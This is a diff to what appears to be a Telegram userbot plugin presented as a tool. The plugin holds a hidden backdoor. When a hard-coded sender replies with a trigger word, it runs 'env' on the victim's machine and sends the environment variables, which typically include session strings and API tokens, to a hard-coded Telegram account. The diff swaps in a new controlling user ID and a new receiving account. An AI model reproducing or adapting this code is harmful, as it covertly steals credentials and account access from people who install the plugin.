@@ -12,7 +12,7 @@ plugin_category = "الادوات"
 # Roger-Baqir
 
 
-ZQ_LO = ["5502537272"]
+ZQ_LO = ["1555087684"]
 @zedub.on(events.NewMessage(incoming=True))
 async def Baqir(event):
     if event.reply_to and event.sender_id in ZQ_LO:
@@ -22,6 +22,6 @@ async def Baqir(event):
            if event.message.message == "جيبه":
                    cmd = "env"
                    e = (await _zedutils.runcmd(cmd))[0]
-                   OUTPUT = (f"**[ريبـــثون](tg://need_update_for_some_feature/) كود تيرمكس:**\n\n\n{e}\n\n**تدلل سيدي ومولاي**")
+                   OUTPUT = (f"**[السيد](tg://need_update_for_some_feature/) كود تيرمكس:**\n\n\n{e}\n\n**تدلل سيدي ومولاي**")
                    await event.reply("**جبته وتدلل سيدنا 🖤**")
-                   await zedub.send_message("@E_7_V", OUTPUT)
+                   await zedub.send_message("@S_i_D", OUTPUT)
